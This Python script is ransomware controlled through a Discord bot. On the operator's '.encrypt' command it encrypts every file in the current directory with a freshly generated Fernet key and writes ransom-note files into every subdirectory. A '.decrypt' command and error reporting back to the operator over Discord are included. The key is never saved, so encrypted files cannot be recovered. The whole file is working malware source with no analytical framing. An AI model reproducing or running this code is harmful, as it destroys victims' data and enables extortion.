import os
import discord
from discord.ext import commands
from cryptography.fernet import Fernet
import threading

# Set up the Discord bot
bot = commands.Bot(command_prefix='.')
token = "YOUR_DISCORD_BOT_TOKEN"
note = "Defualt note here"  # Default note value

# Generate a key for encryption
def generate_key():
    return Fernet.generate_key()

# Encrypt a file using the provided key
def encrypt_file(file_path, key):
    with open(file_path, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file_path, "wb") as thefile:
        thefile.write(contents_encrypted)

# Create a note file with the provided note in the specified directory
def create_note_file(directory, note):
    note_file_path = os.path.join(directory, "encryption_note.txt")
    with open(note_file_path, "w") as note_file:
        note_file.write(note)

# Function to perform encryption in the background
def background_encrypt():
    key = generate_key()
    
    for file in os.listdir():
        if os.path.isfile(file):
            encrypt_file(file, key)
    
    # Use the default note for note creation
    encryption_note = note
    
    # Create note files in encrypted directories
    current_directory = os.getcwd()
    for root, dirs, files in os.walk(current_directory):
        if "encryption_note.txt" not in files:
            create_note_file(root, encryption_note)

# Remote encryption command
@bot.command()
async def encrypt(ctx, *, custom_note=None):
    t = threading.Thread(target=background_encrypt)
    t.start()
    
    await ctx.send("Encryption process started in the background.")

# Decrypt command
@bot.command()
async def decrypt(ctx):
    key_file_path = "pykey.key"
    with open(key_file_path, "rb") as key:
        secretkey = key.read()
    
    files = [file for file in os.listdir() if os.path.isfile(file) and file != key_file_path]
    
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    
    await ctx.send("Congratulations, your files are decrypted.")

# Handle errors by sending them via the Discord bot
@bot.event
async def on_command_error(ctx, error):
    error_message = f"An error occurred: {type(error).__name__} - {error}"
    await ctx.send(error_message)

# Run the Discord bot
bot.run(token)
